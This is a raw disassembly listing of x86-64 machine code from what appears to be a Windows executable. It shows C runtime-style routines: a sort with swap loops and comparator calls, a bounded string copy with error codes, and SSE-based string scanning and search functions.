   140009567:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   14000956a:	88 0a                	mov    %cl,(%rdx)
   14000956c:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009570:	49 83 e8 01          	sub    $0x1,%r8
   140009574:	75 ea                	jne    0x140009560
   140009576:	4d 2b fe             	sub    %r14,%r15
   140009579:	4d 3b fd             	cmp    %r13,%r15
   14000957c:	77 a4                	ja     0x140009522
   14000957e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140009583:	48 83 e9 01          	sub    $0x1,%rcx
   140009587:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000958c:	0f 88 25 02 00 00    	js     0x1400097b7
   140009592:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   140009597:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   14000959e:	00 
   14000959f:	e9 5c ff ff ff       	jmp    0x140009500
   1400095a4:	48 d1 eb             	shr    $1,%rbx
   1400095a7:	49 8b cd             	mov    %r13,%rcx
   1400095aa:	49 0f af de          	imul   %r14,%rbx
   1400095ae:	49 8b c4             	mov    %r12,%rax
   1400095b1:	4a 8d 34 2b          	lea    (%rbx,%r13,1),%rsi
   1400095b5:	48 8b d6             	mov    %rsi,%rdx
   1400095b8:	ff 15 ca 3c 00 00    	call   *0x3cca(%rip)        # 0x14000d288
   1400095be:	85 c0                	test   %eax,%eax
   1400095c0:	7e 29                	jle    0x1400095eb
   1400095c2:	4d 8b ce             	mov    %r14,%r9
   1400095c5:	4c 8b c6             	mov    %rsi,%r8
   1400095c8:	4c 3b ee             	cmp    %rsi,%r13
   1400095cb:	74 1e                	je     0x1400095eb
   1400095cd:	0f 1f 00             	nopl   (%rax)
   1400095d0:	41 0f b6 00          	movzbl (%r8),%eax
   1400095d4:	49 8b d0             	mov    %r8,%rdx
   1400095d7:	48 2b d3             	sub    %rbx,%rdx
   1400095da:	0f b6 0a             	movzbl (%rdx),%ecx
   1400095dd:	88 02                	mov    %al,(%rdx)
   1400095df:	41 88 08             	mov    %cl,(%r8)
   1400095e2:	49 ff c0             	inc    %r8
   1400095e5:	49 83 e9 01          	sub    $0x1,%r9
   1400095e9:	75 e5                	jne    0x1400095d0
   1400095eb:	49 8b d7             	mov    %r15,%rdx
   1400095ee:	49 8b cd             	mov    %r13,%rcx
   1400095f1:	49 8b c4             	mov    %r12,%rax
   1400095f4:	ff 15 8e 3c 00 00    	call   *0x3c8e(%rip)        # 0x14000d288
   1400095fa:	85 c0                	test   %eax,%eax
   1400095fc:	7e 2a                	jle    0x140009628
   1400095fe:	4d 8b c6             	mov    %r14,%r8
   140009601:	49 8b d7             	mov    %r15,%rdx
   140009604:	4d 3b ef             	cmp    %r15,%r13
   140009607:	74 1f                	je     0x140009628
   140009609:	4d 8b cd             	mov    %r13,%r9
   14000960c:	4d 2b cf             	sub    %r15,%r9
   14000960f:	90                   	nop
   140009610:	0f b6 02             	movzbl (%rdx),%eax
   140009613:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   140009618:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000961c:	88 0a                	mov    %cl,(%rdx)
   14000961e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009622:	49 83 e8 01          	sub    $0x1,%r8
   140009626:	75 e8                	jne    0x140009610
   140009628:	49 8b d7             	mov    %r15,%rdx
   14000962b:	48 8b ce             	mov    %rsi,%rcx
   14000962e:	49 8b c4             	mov    %r12,%rax
   140009631:	ff 15 51 3c 00 00    	call   *0x3c51(%rip)        # 0x14000d288
   140009637:	85 c0                	test   %eax,%eax
   140009639:	7e 2d                	jle    0x140009668
   14000963b:	4d 8b c6             	mov    %r14,%r8
   14000963e:	49 8b d7             	mov    %r15,%rdx
   140009641:	49 3b f7             	cmp    %r15,%rsi
   140009644:	74 22                	je     0x140009668
   140009646:	4c 8b ce             	mov    %rsi,%r9
   140009649:	4d 2b cf             	sub    %r15,%r9
   14000964c:	0f 1f 40 00          	nopl   0x0(%rax)
   140009650:	0f b6 02             	movzbl (%rdx),%eax
   140009653:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   140009658:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000965c:	88 0a                	mov    %cl,(%rdx)
   14000965e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009662:	49 83 e8 01          	sub    $0x1,%r8
   140009666:	75 e8                	jne    0x140009650
   140009668:	49 8b dd             	mov    %r13,%rbx
   14000966b:	49 8b ff             	mov    %r15,%rdi
   14000966e:	66 90                	xchg   %ax,%ax
   140009670:	48 3b f3             	cmp    %rbx,%rsi
   140009673:	76 1d                	jbe    0x140009692
   140009675:	49 03 de             	add    %r14,%rbx
   140009678:	48 3b de             	cmp    %rsi,%rbx
   14000967b:	73 15                	jae    0x140009692
   14000967d:	48 8b d6             	mov    %rsi,%rdx
   140009680:	48 8b cb             	mov    %rbx,%rcx
   140009683:	49 8b c4             	mov    %r12,%rax
   140009686:	ff 15 fc 3b 00 00    	call   *0x3bfc(%rip)        # 0x14000d288
   14000968c:	85 c0                	test   %eax,%eax
   14000968e:	7e e5                	jle    0x140009675
   140009690:	eb 1e                	jmp    0x1400096b0
   140009692:	49 03 de             	add    %r14,%rbx
   140009695:	49 3b df             	cmp    %r15,%rbx
   140009698:	77 16                	ja     0x1400096b0
   14000969a:	48 8b d6             	mov    %rsi,%rdx
   14000969d:	48 8b cb             	mov    %rbx,%rcx
   1400096a0:	49 8b c4             	mov    %r12,%rax
   1400096a3:	ff 15 df 3b 00 00    	call   *0x3bdf(%rip)        # 0x14000d288
   1400096a9:	85 c0                	test   %eax,%eax
   1400096ab:	7e e5                	jle    0x140009692
   1400096ad:	0f 1f 00             	nopl   (%rax)
   1400096b0:	48 8b ef             	mov    %rdi,%rbp
   1400096b3:	49 2b fe             	sub    %r14,%rdi
   1400096b6:	48 3b fe             	cmp    %rsi,%rdi
   1400096b9:	76 13                	jbe    0x1400096ce
   1400096bb:	48 8b d6             	mov    %rsi,%rdx
   1400096be:	48 8b cf             	mov    %rdi,%rcx
   1400096c1:	49 8b c4             	mov    %r12,%rax
   1400096c4:	ff 15 be 3b 00 00    	call   *0x3bbe(%rip)        # 0x14000d288
   1400096ca:	85 c0                	test   %eax,%eax
   1400096cc:	7f e2                	jg     0x1400096b0
   1400096ce:	48 3b fb             	cmp    %rbx,%rdi
   1400096d1:	72 38                	jb     0x14000970b
   1400096d3:	4d 8b c6             	mov    %r14,%r8
   1400096d6:	48 8b d7             	mov    %rdi,%rdx
   1400096d9:	74 1e                	je     0x1400096f9
   1400096db:	4c 8b cb             	mov    %rbx,%r9
   1400096de:	4c 2b cf             	sub    %rdi,%r9
   1400096e1:	0f b6 02             	movzbl (%rdx),%eax
   1400096e4:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   1400096e9:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   1400096ed:	88 0a                	mov    %cl,(%rdx)
   1400096ef:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   1400096f3:	49 83 e8 01          	sub    $0x1,%r8
   1400096f7:	75 e8                	jne    0x1400096e1
   1400096f9:	48 3b f7             	cmp    %rdi,%rsi
   1400096fc:	48 8b c3             	mov    %rbx,%rax
   1400096ff:	48 0f 45 c6          	cmovne %rsi,%rax
   140009703:	48 8b f0             	mov    %rax,%rsi
   140009706:	e9 65 ff ff ff       	jmp    0x140009670
   14000970b:	48 3b f5             	cmp    %rbp,%rsi
   14000970e:	73 20                	jae    0x140009730
   140009710:	49 2b ee             	sub    %r14,%rbp
   140009713:	48 3b ee             	cmp    %rsi,%rbp
   140009716:	76 18                	jbe    0x140009730
   140009718:	48 8b d6             	mov    %rsi,%rdx
   14000971b:	48 8b cd             	mov    %rbp,%rcx
   14000971e:	49 8b c4             	mov    %r12,%rax
   140009721:	ff 15 61 3b 00 00    	call   *0x3b61(%rip)        # 0x14000d288
   140009727:	85 c0                	test   %eax,%eax
   140009729:	74 e5                	je     0x140009710
   14000972b:	eb 1e                	jmp    0x14000974b
   14000972d:	0f 1f 00             	nopl   (%rax)
   140009730:	49 2b ee             	sub    %r14,%rbp
   140009733:	49 3b ed             	cmp    %r13,%rbp
   140009736:	76 13                	jbe    0x14000974b
   140009738:	48 8b d6             	mov    %rsi,%rdx
   14000973b:	48 8b cd             	mov    %rbp,%rcx
   14000973e:	49 8b c4             	mov    %r12,%rax
   140009741:	ff 15 41 3b 00 00    	call   *0x3b41(%rip)        # 0x14000d288
   140009747:	85 c0                	test   %eax,%eax
   140009749:	74 e5                	je     0x140009730
   14000974b:	49 8b cf             	mov    %r15,%rcx
   14000974e:	48 8b c5             	mov    %rbp,%rax
   140009751:	48 2b cb             	sub    %rbx,%rcx
   140009754:	49 2b c5             	sub    %r13,%rax
   140009757:	48 3b c1             	cmp    %rcx,%rax
   14000975a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000975f:	7c 2b                	jl     0x14000978c
   140009761:	4c 3b ed             	cmp    %rbp,%r13
   140009764:	73 15                	jae    0x14000977b
   140009766:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   14000976b:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   140009772:	00 
   140009773:	48 ff c1             	inc    %rcx
   140009776:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000977b:	49 3b df             	cmp    %r15,%rbx
   14000977e:	0f 83 ff fd ff ff    	jae    0x140009583
   140009784:	4c 8b eb             	mov    %rbx,%r13
   140009787:	e9 74 fd ff ff       	jmp    0x140009500
   14000978c:	49 3b df             	cmp    %r15,%rbx
   14000978f:	73 15                	jae    0x1400097a6
   140009791:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   140009796:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   14000979d:	00 
   14000979e:	48 ff c1             	inc    %rcx
   1400097a1:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400097a6:	4c 3b ed             	cmp    %rbp,%r13
   1400097a9:	0f 83 d4 fd ff ff    	jae    0x140009583
   1400097af:	4c 8b fd             	mov    %rbp,%r15
   1400097b2:	e9 49 fd ff ff       	jmp    0x140009500
   1400097b7:	48 8b bc 24 30 04 00 	mov    0x430(%rsp),%rdi
   1400097be:	00 
   1400097bf:	48 8b b4 24 38 04 00 	mov    0x438(%rsp),%rsi
   1400097c6:	00 
   1400097c7:	48 8b ac 24 40 04 00 	mov    0x440(%rsp),%rbp
   1400097ce:	00 
   1400097cf:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   1400097d6:	00 
   1400097d7:	4c 8b bc 24 28 04 00 	mov    0x428(%rsp),%r15
   1400097de:	00 
   1400097df:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   1400097e6:	00 
   1400097e7:	48 33 cc             	xor    %rsp,%rcx
   1400097ea:	e8 91 7d ff ff       	call   0x140001580
   1400097ef:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   1400097f6:	41 5e                	pop    %r14
   1400097f8:	41 5d                	pop    %r13
   1400097fa:	41 5c                	pop    %r12
   1400097fc:	c3                   	ret
   1400097fd:	cc                   	int3
   1400097fe:	cc                   	int3
   1400097ff:	cc                   	int3
   140009800:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009805:	57                   	push   %rdi
   140009806:	48 83 ec 20          	sub    $0x20,%rsp
   14000980a:	45 33 d2             	xor    %r10d,%r10d
   14000980d:	49 8b d8             	mov    %r8,%rbx
   140009810:	4c 8b da             	mov    %rdx,%r11
   140009813:	4d 85 c9             	test   %r9,%r9
   140009816:	75 2c                	jne    0x140009844
   140009818:	48 85 c9             	test   %rcx,%rcx
   14000981b:	75 2c                	jne    0x140009849
   14000981d:	48 85 d2             	test   %rdx,%rdx
   140009820:	74 14                	je     0x140009836
   140009822:	e8 69 c1 ff ff       	call   0x140005990
   140009827:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000982c:	89 18                	mov    %ebx,(%rax)
   14000982e:	e8 3d c0 ff ff       	call   0x140005870
   140009833:	44 8b d3             	mov    %ebx,%r10d
   140009836:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000983b:	41 8b c2             	mov    %r10d,%eax
   14000983e:	48 83 c4 20          	add    $0x20,%rsp
   140009842:	5f                   	pop    %rdi
   140009843:	c3                   	ret
   140009844:	48 85 c9             	test   %rcx,%rcx
   140009847:	74 d9                	je     0x140009822
   140009849:	4d 85 db             	test   %r11,%r11
   14000984c:	74 d4                	je     0x140009822
   14000984e:	4d 85 c9             	test   %r9,%r9
   140009851:	75 05                	jne    0x140009858
   140009853:	44 88 11             	mov    %r10b,(%rcx)
   140009856:	eb de                	jmp    0x140009836
   140009858:	48 85 db             	test   %rbx,%rbx
   14000985b:	75 05                	jne    0x140009862
   14000985d:	44 88 11             	mov    %r10b,(%rcx)
   140009860:	eb c0                	jmp    0x140009822
   140009862:	48 2b d9             	sub    %rcx,%rbx
   140009865:	48 8b d1             	mov    %rcx,%rdx
   140009868:	4d 8b c3             	mov    %r11,%r8
   14000986b:	49 8b f9             	mov    %r9,%rdi
   14000986e:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   140009872:	75 14                	jne    0x140009888
   140009874:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   140009877:	88 02                	mov    %al,(%rdx)
   140009879:	48 ff c2             	inc    %rdx
   14000987c:	84 c0                	test   %al,%al
   14000987e:	74 28                	je     0x1400098a8
   140009880:	49 83 e8 01          	sub    $0x1,%r8
   140009884:	75 ee                	jne    0x140009874
   140009886:	eb 20                	jmp    0x1400098a8
   140009888:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   14000988b:	88 02                	mov    %al,(%rdx)
   14000988d:	48 ff c2             	inc    %rdx
   140009890:	84 c0                	test   %al,%al
   140009892:	74 0c                	je     0x1400098a0
   140009894:	49 83 e8 01          	sub    $0x1,%r8
   140009898:	74 06                	je     0x1400098a0
   14000989a:	48 83 ef 01          	sub    $0x1,%rdi
   14000989e:	75 e8                	jne    0x140009888
   1400098a0:	48 85 ff             	test   %rdi,%rdi
   1400098a3:	75 03                	jne    0x1400098a8
   1400098a5:	44 88 12             	mov    %r10b,(%rdx)
   1400098a8:	4d 85 c0             	test   %r8,%r8
   1400098ab:	75 89                	jne    0x140009836
   1400098ad:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   1400098b1:	75 0e                	jne    0x1400098c1
   1400098b3:	46 88 54 19 ff       	mov    %r10b,-0x1(%rcx,%r11,1)
   1400098b8:	45 8d 50 50          	lea    0x50(%r8),%r10d
   1400098bc:	e9 75 ff ff ff       	jmp    0x140009836
   1400098c1:	44 88 11             	mov    %r10b,(%rcx)
   1400098c4:	e8 c7 c0 ff ff       	call   0x140005990
   1400098c9:	bb 22 00 00 00       	mov    $0x22,%ebx
   1400098ce:	e9 59 ff ff ff       	jmp    0x14000982c
   1400098d3:	cc                   	int3
   1400098d4:	48 83 ec 58          	sub    $0x58,%rsp
   1400098d8:	48 8b 05 21 d7 00 00 	mov    0xd721(%rip),%rax        # 0x140017000
   1400098df:	48 33 c4             	xor    %rsp,%rax
   1400098e2:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400098e7:	33 c0                	xor    %eax,%eax
   1400098e9:	4c 8b ca             	mov    %rdx,%r9
   1400098ec:	48 83 f8 20          	cmp    $0x20,%rax
   1400098f0:	4c 8b c1             	mov    %rcx,%r8
   1400098f3:	73 77                	jae    0x14000996c
   1400098f5:	c6 44 04 20 00       	movb   $0x0,0x20(%rsp,%rax,1)
   1400098fa:	48 ff c0             	inc    %rax
   1400098fd:	48 83 f8 20          	cmp    $0x20,%rax
   140009901:	7c f0                	jl     0x1400098f3
   140009903:	8a 02                	mov    (%rdx),%al
   140009905:	eb 1f                	jmp    0x140009926
   140009907:	0f b6 d0             	movzbl %al,%edx
   14000990a:	48 c1 ea 03          	shr    $0x3,%rdx
   14000990e:	0f b6 c0             	movzbl %al,%eax
   140009911:	83 e0 07             	and    $0x7,%eax
   140009914:	0f b6 4c 14 20       	movzbl 0x20(%rsp,%rdx,1),%ecx
   140009919:	0f ab c1             	bts    %eax,%ecx
   14000991c:	49 ff c1             	inc    %r9
   14000991f:	88 4c 14 20          	mov    %cl,0x20(%rsp,%rdx,1)
   140009923:	41 8a 01             	mov    (%r9),%al
   140009926:	84 c0                	test   %al,%al
   140009928:	75 dd                	jne    0x140009907
   14000992a:	eb 1f                	jmp    0x14000994b
   14000992c:	41 0f b6 c1          	movzbl %r9b,%eax
   140009930:	ba 01 00 00 00       	mov    $0x1,%edx
   140009935:	41 0f b6 c9          	movzbl %r9b,%ecx
   140009939:	83 e1 07             	and    $0x7,%ecx
   14000993c:	48 c1 e8 03          	shr    $0x3,%rax
   140009940:	d3 e2                	shl    %cl,%edx
   140009942:	84 54 04 20          	test   %dl,0x20(%rsp,%rax,1)
   140009946:	75 1f                	jne    0x140009967
   140009948:	49 ff c0             	inc    %r8
   14000994b:	45 8a 08             	mov    (%r8),%r9b
   14000994e:	45 84 c9             	test   %r9b,%r9b
   140009951:	75 d9                	jne    0x14000992c
   140009953:	33 c0                	xor    %eax,%eax
   140009955:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000995a:	48 33 cc             	xor    %rsp,%rcx
   14000995d:	e8 1e 7c ff ff       	call   0x140001580
   140009962:	48 83 c4 58          	add    $0x58,%rsp
   140009966:	c3                   	ret
   140009967:	49 8b c0             	mov    %r8,%rax
   14000996a:	eb e9                	jmp    0x140009955
   14000996c:	e8 ef 7f ff ff       	call   0x140001960
   140009971:	cc                   	int3
   140009972:	cc                   	int3
   140009973:	cc                   	int3
   140009974:	cc                   	int3
   140009975:	cc                   	int3
   140009976:	cc                   	int3
   140009977:	cc                   	int3
   140009978:	cc                   	int3
   140009979:	cc                   	int3
   14000997a:	cc                   	int3
   14000997b:	cc                   	int3
   14000997c:	cc                   	int3
   14000997d:	cc                   	int3
   14000997e:	cc                   	int3
   14000997f:	cc                   	int3
   140009980:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009985:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000998a:	57                   	push   %rdi
   14000998b:	4c 8b d2             	mov    %rdx,%r10
   14000998e:	48 8d 35 6b 66 ff ff 	lea    -0x9995(%rip),%rsi        # 0x140000000
   140009995:	41 83 e2 0f          	and    $0xf,%r10d
   140009999:	48 8b fa             	mov    %rdx,%rdi
   14000999c:	49 2b fa             	sub    %r10,%rdi
   14000999f:	48 8b da             	mov    %rdx,%rbx
   1400099a2:	4c 8b c1             	mov    %rcx,%r8
   1400099a5:	0f 57 db             	xorps  %xmm3,%xmm3
   1400099a8:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   1400099ac:	f3 0f 6f 0f          	movdqu (%rdi),%xmm1
   1400099b0:	48 83 f8 0e          	cmp    $0xe,%rax
   1400099b4:	77 73                	ja     0x140009a29
   1400099b6:	8b 84 86 8c 9c 00 00 	mov    0x9c8c(%rsi,%rax,4),%eax
   1400099bd:	48 03 c6             	add    %rsi,%rax
   1400099c0:	ff e0                	jmp    *%rax
   1400099c2:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   1400099c7:	eb 60                	jmp    0x140009a29
   1400099c9:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   1400099ce:	eb 59                	jmp    0x140009a29
   1400099d0:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   1400099d5:	eb 52                	jmp    0x140009a29
   1400099d7:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   1400099dc:	eb 4b                	jmp    0x140009a29
   1400099de:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   1400099e3:	eb 44                	jmp    0x140009a29
   1400099e5:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   1400099ea:	eb 3d                	jmp    0x140009a29
   1400099ec:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   1400099f1:	eb 36                	jmp    0x140009a29
   1400099f3:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   1400099f8:	eb 2f                	jmp    0x140009a29
   1400099fa:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   1400099ff:	eb 28                	jmp    0x140009a29
   140009a01:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   140009a06:	eb 21                	jmp    0x140009a29
   140009a08:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   140009a0d:	eb 1a                	jmp    0x140009a29
   140009a0f:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   140009a14:	eb 13                	jmp    0x140009a29
   140009a16:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   140009a1b:	eb 0c                	jmp    0x140009a29
   140009a1d:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   140009a22:	eb 05                	jmp    0x140009a29
   140009a24:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   140009a29:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009a2c:	41 b9 0f 00 00 00    	mov    $0xf,%r9d
   140009a32:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   140009a36:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140009a3a:	85 c0                	test   %eax,%eax
   140009a3c:	0f 84 33 01 00 00    	je     0x140009b75
   140009a42:	0f bc d0             	bsf    %eax,%edx
   140009a45:	4d 85 d2             	test   %r10,%r10
   140009a48:	75 06                	jne    0x140009a50
   140009a4a:	45 8d 59 f2          	lea    -0xe(%r9),%r11d
   140009a4e:	eb 14                	jmp    0x140009a64
   140009a50:	45 33 db             	xor    %r11d,%r11d
   140009a53:	8b c2                	mov    %edx,%eax
   140009a55:	b9 10 00 00 00       	mov    $0x10,%ecx
   140009a5a:	49 2b ca             	sub    %r10,%rcx
   140009a5d:	48 3b c1             	cmp    %rcx,%rax
   140009a60:	41 0f 92 c3          	setb   %r11b
   140009a64:	41 8b c1             	mov    %r9d,%eax
   140009a67:	2b c2                	sub    %edx,%eax
   140009a69:	41 3b c1             	cmp    %r9d,%eax
   140009a6c:	0f 87 cf 00 00 00    	ja     0x140009b41
   140009a72:	8b 8c 86 c8 9c 00 00 	mov    0x9cc8(%rsi,%rax,4),%ecx
   140009a79:	48 03 ce             	add    %rsi,%rcx
   140009a7c:	ff e1                	jmp    *%rcx
   140009a7e:	66 0f 73 f9 01       	pslldq $0x1,%xmm1
   140009a83:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   140009a88:	e9 b4 00 00 00       	jmp    0x140009b41
   140009a8d:	66 0f 73 f9 02       	pslldq $0x2,%xmm1
   140009a92:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   140009a97:	e9 a5 00 00 00       	jmp    0x140009b41
   140009a9c:	66 0f 73 f9 03       	pslldq $0x3,%xmm1
   140009aa1:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   140009aa6:	e9 96 00 00 00       	jmp    0x140009b41
   140009aab:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   140009ab0:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   140009ab5:	e9 87 00 00 00       	jmp    0x140009b41
   140009aba:	66 0f 73 f9 05       	pslldq $0x5,%xmm1
   140009abf:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   140009ac4:	eb 7b                	jmp    0x140009b41
   140009ac6:	66 0f 73 f9 06       	pslldq $0x6,%xmm1
   140009acb:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   140009ad0:	eb 6f                	jmp    0x140009b41
   140009ad2:	66 0f 73 f9 07       	pslldq $0x7,%xmm1
   140009ad7:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   140009adc:	eb 63                	jmp    0x140009b41
   140009ade:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   140009ae3:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   140009ae8:	eb 57                	jmp    0x140009b41
   140009aea:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
   140009aef:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   140009af4:	eb 4b                	jmp    0x140009b41
   140009af6:	66 0f 73 f9 0a       	pslldq $0xa,%xmm1
   140009afb:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   140009b00:	eb 3f                	jmp    0x140009b41
   140009b02:	66 0f 73 f9 0b       	pslldq $0xb,%xmm1
   140009b07:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   140009b0c:	eb 33                	jmp    0x140009b41
   140009b0e:	66 0f 73 f9 0c       	pslldq $0xc,%xmm1
   140009b13:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   140009b18:	eb 27                	jmp    0x140009b41
   140009b1a:	66 0f 73 f9 0d       	pslldq $0xd,%xmm1
   140009b1f:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   140009b24:	eb 1b                	jmp    0x140009b41
   140009b26:	66 0f 73 f9 0e       	pslldq $0xe,%xmm1
   140009b2b:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   140009b30:	eb 0f                	jmp    0x140009b41
   140009b32:	66 0f 73 f9 0f       	pslldq $0xf,%xmm1
   140009b37:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   140009b3c:	eb 03                	jmp    0x140009b41
   140009b3e:	0f 57 c9             	xorps  %xmm1,%xmm1
   140009b41:	45 85 db             	test   %r11d,%r11d
   140009b44:	0f 85 e6 00 00 00    	jne    0x140009c30
   140009b4a:	f3 0f 6f 57 10       	movdqu 0x10(%rdi),%xmm2
   140009b4f:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   140009b53:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   140009b57:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140009b5b:	85 c0                	test   %eax,%eax
   140009b5d:	75 35                	jne    0x140009b94
   140009b5f:	48 8b d3             	mov    %rbx,%rdx
   140009b62:	49 8b c8             	mov    %r8,%rcx
   140009b65:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009b6a:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140009b6f:	5f                   	pop    %rdi
   140009b70:	e9 5f fd ff ff       	jmp    0x1400098d4
   140009b75:	4d 85 d2             	test   %r10,%r10
   140009b78:	75 d0                	jne    0x140009b4a
   140009b7a:	44 38 57 01          	cmp    %r10b,0x1(%rdi)
   140009b7e:	0f 84 ac 00 00 00    	je     0x140009c30
   140009b84:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009b89:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140009b8e:	5f                   	pop    %rdi
   140009b8f:	e9 40 fd ff ff       	jmp    0x1400098d4
   140009b94:	0f bc c8             	bsf    %eax,%ecx
   140009b97:	8b c1                	mov    %ecx,%eax
   140009b99:	49 2b c2             	sub    %r10,%rax
   140009b9c:	48 83 c0 10          	add    $0x10,%rax
   140009ba0:	48 83 f8 10          	cmp    $0x10,%rax
   140009ba4:	77 b9                	ja     0x140009b5f
   140009ba6:	44 2b c9             	sub    %ecx,%r9d
   140009ba9:	41 83 f9 0f          	cmp    $0xf,%r9d
   140009bad:	77 79                	ja     0x140009c28
   140009baf:	42 8b 8c 8e 08 9d 00 	mov    0x9d08(%rsi,%r9,4),%ecx
   140009bb6:	00 
   140009bb7:	48 03 ce             	add    %rsi,%rcx
   140009bba:	ff e1                	jmp    *%rcx
   140009bbc:	66 0f 73 fa 01       	pslldq $0x1,%xmm2
   140009bc1:	eb 65                	jmp    0x140009c28
   140009bc3:	66 0f 73 fa 02       	pslldq $0x2,%xmm2
   140009bc8:	eb 5e                	jmp    0x140009c28
   140009bca:	66 0f 73 fa 03       	pslldq $0x3,%xmm2
   140009bcf:	eb 57                	jmp    0x140009c28
   140009bd1:	66 0f 73 fa 04       	pslldq $0x4,%xmm2
   140009bd6:	eb 50                	jmp    0x140009c28
   140009bd8:	66 0f 73 fa 05       	pslldq $0x5,%xmm2
   140009bdd:	eb 49                	jmp    0x140009c28
   140009bdf:	66 0f 73 fa 06       	pslldq $0x6,%xmm2
   140009be4:	eb 42                	jmp    0x140009c28
   140009be6:	66 0f 73 fa 07       	pslldq $0x7,%xmm2
   140009beb:	eb 3b                	jmp    0x140009c28
   140009bed:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   140009bf2:	eb 34                	jmp    0x140009c28
   140009bf4:	66 0f 73 fa 09       	pslldq $0x9,%xmm2
   140009bf9:	eb 2d                	jmp    0x140009c28
   140009bfb:	66 0f 73 fa 0a       	pslldq $0xa,%xmm2
   140009c00:	eb 26                	jmp    0x140009c28
   140009c02:	66 0f 73 fa 0b       	pslldq $0xb,%xmm2
   140009c07:	eb 1f                	jmp    0x140009c28
   140009c09:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   140009c0e:	eb 18                	jmp    0x140009c28
   140009c10:	66 0f 73 fa 0d       	pslldq $0xd,%xmm2
   140009c15:	eb 11                	jmp    0x140009c28
   140009c17:	66 0f 73 fa 0e       	pslldq $0xe,%xmm2
   140009c1c:	eb 0a                	jmp    0x140009c28
   140009c1e:	66 0f 73 fa 0f       	pslldq $0xf,%xmm2
   140009c23:	eb 03                	jmp    0x140009c28
   140009c25:	0f 57 d2             	xorps  %xmm2,%xmm2
   140009c28:	66 0f eb d1          	por    %xmm1,%xmm2
   140009c2c:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   140009c30:	41 0f b6 00          	movzbl (%r8),%eax
   140009c34:	84 c0                	test   %al,%al
